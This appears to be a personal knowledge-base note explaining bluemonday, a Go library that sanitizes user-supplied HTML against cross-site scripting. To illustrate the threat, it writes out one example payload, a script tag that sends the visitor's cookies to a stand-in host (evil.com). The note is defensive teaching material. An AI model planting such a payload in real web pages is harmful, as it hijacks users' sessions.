# bluemonday

## What it is
Think of it as a strict nightclub bouncer who checks every person (HTML tag and attribute) against an approved guest list — anyone not on the list gets turned away at the door. Bluemonday is a Go library for HTML sanitization that uses a whitelist policy to strip or escape dangerous HTML content from user-supplied input, preventing Cross-Site Scripting (XSS) attacks.

## Why it matters
Suppose a blog platform allows users to submit comments with basic formatting like bold and italic text. Without sanitization, an attacker submits `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`, hijacking session cookies from every user who views the comment. Bluemonday intercepts this at ingestion time, stripping the `<script>` tag entirely before it ever reaches the database or gets rendered in a browser.

## Key facts
- Bluemonday operates on a **whitelist model** — only explicitly permitted tags and attributes pass through; everything else is stripped, making it secure by default rather than by exception.
- It is written in **Go** and designed for server-side sanitization of HTML before storage or rendering.
- Policies are fully configurable: developers can define `UGCPolicy()` (user-generated content) or build custom policies allowing only specific tags like `<b>`, `<i>`, and `<a>` with restricted attributes.
- It protects against **stored XSS** (persisted malicious scripts) and **reflected XSS** by normalizing HTML before output.
- Bluemonday uses the **golang.org/x/net/html** tokenizer under the hood, meaning it parses HTML properly rather than relying on fragile regex — a common failure point in DIY sanitizers.

## Related concepts
[[Cross-Site Scripting (XSS)]] [[Input Validation]] [[Content Security Policy]] [[HTML Encoding]] [[Output Encoding]]